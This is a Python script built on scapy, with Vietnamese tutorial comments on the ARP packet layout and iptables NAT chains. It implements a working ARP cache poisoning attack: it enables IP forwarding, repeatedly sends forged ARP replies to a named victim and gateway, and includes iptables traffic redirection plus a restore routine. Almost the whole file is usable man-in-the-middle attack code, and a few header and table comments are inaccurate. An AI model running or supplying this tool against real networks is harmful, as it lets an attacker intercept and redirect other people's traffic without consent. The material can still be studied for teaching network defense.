# -*- coding: utf-8 -*-
"""

Trong phần này chúng ta sẽ tìm cách  dùng arpspoof
tìm hiểu giao thức arp, giao thức arp nằm ở lớp 3, thông tin packet của gói arp

----------------------------ARP-------------------------------
[Hardware type : 2 byte] 1(Ethernet)/..                      | 
[Protocol type : 2 byte] 8(IP)/..                            |  
[Hardware size : 2 byte] 6                                   |
[protocol size : 2 byte] 4                                   | 
[opcode : 2 byte]        1(request)/ 2(replay)               |
[Sender Mac address]     Địa chỉ mac của máy gởi             |
[Sender IP address]      Địa chỉ IP  của máy gởi             |
[Target Mac address]     Địa chỉ mac của máy dích            |
[Target IP address]      Địa chỉ mac của máy dích            |
--------------------------------------------------------------


mỗi frame layer2 đóng mỗi kiểu khác nhau nhưng vẫn có các thành phần sau

---------------------------FRAME LAYER 2----------------------|
[Source Mac]   Địa chỉ mac của máy gởi                        |
[Dest Mac]     Địa chỉ mac của máy nhận                       |
[Type]         Ethernet/ wifi/ pppoe                          |                             
--------------------------------------------------------------|

"""

"""
Tìm hiểu sơ qua về các chain của iptables

NAT:
      - PREROUTING: thay đổi [destination ip]
      - POSTROUTING: thay đổi [source ip]


"""

from scapy.all import *
from argparse import ArgumentParser

import os

from scapy.layers.l2 import ARP

IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
TIMEOUT = 2
RETRY = 10


# parse argument trên command line
def set_configs():

    parser = ArgumentParser()


    parser.add_argument('-t',
                        dest='victim',
                        required=True,
                        type=str,
                        help='The victim\'s IP address')

    parser.add_argument('-g',
                        dest='gateway',
                        required=True,
                        type=str,
                        help='The gateway\'s IP address')

    parser.add_argument('-i',
                        dest='interface',
                        required=True,
                        type=str,
                        help='Use this network interface')

    parser.add_argument('-p',
                        dest='portsource',
                        required=True,
                        type=str,
                        help='configure port source of victim')

    parser.add_argument('-o',
                        dest='portdest',
                        required=True,
                        type=str,
                        help='configure port source of victim')

    args = parser.parse_args()

    return {

        'victim': {

            'ip': args.victim,
            'mac': ip_to_mac(args.victim),
        },

        'gateway': {
            'ip': args.gateway,
            'mac': ip_to_mac(args.gateway),
        },

        'iface': args.interface,
        'portsoure': args.portsource,
        'portdest': args.portdest,
    }


# cho phép forward packet  trong filesystem
def enable_packet_forwarding():
    with open(IP_FORWARD, 'w') as fd:
        fd.write('1')


# tắt tính năng forward packet
def disable_packet_forwarding():
    with open(IP_FORWARD, 'w') as fd:
        fd.write('0')


# execute command add rule iptables
def enable_redirection(configs):
    print '[*] Redirecting all http traffic to port %s' %( str(configs["portsoure"]))

    os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port %s -j REDIRECT --to-port %s' %(str(configs["portsoure"]), str(configs["portdest"])))


# xóa tất cả rule iptables
def disable_redirection():
    print '[*] Disabling http redirection'

    os.system('iptables -v --flush')
    os.system('iptables -v --table nat --flush')
    os.system('iptables -v --delete-chain')
    os.system('iptables -v --table nat --delete-chain')


# đầu độc victime và router
def poison_victim(configs):


    victim_mac = configs["victim"]["mac"]
    gateway_mac = configs["gateway"]["mac"]

    victim_ip = configs["victim"]["ip"]
    gateway_ip = configs["gateway"]["ip"]

    while True:

        try:

            print '[*] Poisoning victim'

            # gởi gói đầu đọc victim bằng gói arp repl op = 2
            # |---------------|--------------------|-----------------------|-------------------------|
            # | ip sender: gw | mac sender:   ""   | ip target: ip victim  | mac target: mac victim  |
            # |---------------|--------------------|-----------------------|-------------------------|

            send(ARP(op=2, psrc=gateway_ip, hwdst=victim_mac, pdst=victim_ip))

            # gởi gói đầu đọc router
            # |----------------------|--------------------|-----------------------|-------------------------|
            # | ip sender: ip victim | mac sender: ""     | ip target: ip gw      | mac target: mac gw      |
            # |----------------------|--------------------|-----------------------|-------------------------|
            send(ARP(op=2, psrc=victim_ip, hwdst=gateway_mac, pdst=gateway_ip))

            # wait for ARP replies from default GW or victim
            sniff(filter='arp and host %s or %s' % \
                         (gateway_ip, victim_ip), count=1)


        # break out of loop if user hits ctrl+c
        except KeyboardInterrupt:
            antidote(configs)
            break

    print '[*] All done!'


# restores the victim and gateway's arp cache to its correct
def restore_victim(configs):
    victim_mac = configs["victim"]["mac"]
    gateway_mac = configs["gateway"]["mac"]

    victim_ip = configs["victim"]["ip"]
    gateway_ip = configs["gateway"]["ip"]

    # gởi gói restore victim
    # |----------------------|------------------------------|-----------------------|---------------------------------|
    # | ip sender: victim_ip | mac sender:  mac victim      | ip target: ""         | mac target: 'ff:ff:ff:ff:ff:ff' |
    # |----------------------|------------------------------|-----------------------|---------------------------------|

    send(ARP(op=2, hwsrc=victim_mac ,psrc=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"))

    # gởi gói restore router
    # |----------------------|------------------------------|-----------------------|---------------------------------|
    # | ip sender: victim_ip | mac sender:  mac victim      | ip target: ""         | mac target: 'ff:ff:ff:ff:ff:ff' |
    # |----------------------|------------------------------|-----------------------|---------------------------------|
    send(ARP(op=2, hwsrc=gateway_mac, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"))




# get mac từ ip bằng gói arp
def ip_to_mac(ip, retry=RETRY, timeout=TIMEOUT):

    response, unanswered = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=retry, timeout=timeout)

    # lấy thông tin từ gói respone
    # layer 2 header
    for s, r in response:
        return r[ARP].underlayer.src

    # return failure
    return None


# driver function for arp cache poisoning attack
def poison(configs):
    enable_packet_forwarding()
    # enable_redirection(configs)
    poison_victim(configs)


# driver function for restoring victim and gateway after
# arp cache poisoning attack
def antidote(configs):
    restore_victim(configs)
    disable_redirection()
    disable_packet_forwarding()


def main():
    configs = set_configs()

    print '[*] Using interface', configs['iface']
    print "[*] Gateway %s  is at %s"  %(configs["gateway"]["ip"], configs["gateway"]["mac"])
    print "[*] Target %s  is at %s" % (configs["victim"]["ip"], configs["victim"]["mac"])
    conf.iface = configs['iface']

    try:
        poison(configs)
    except:
        antidote(configs)


if __name__ == '__main__':
    main()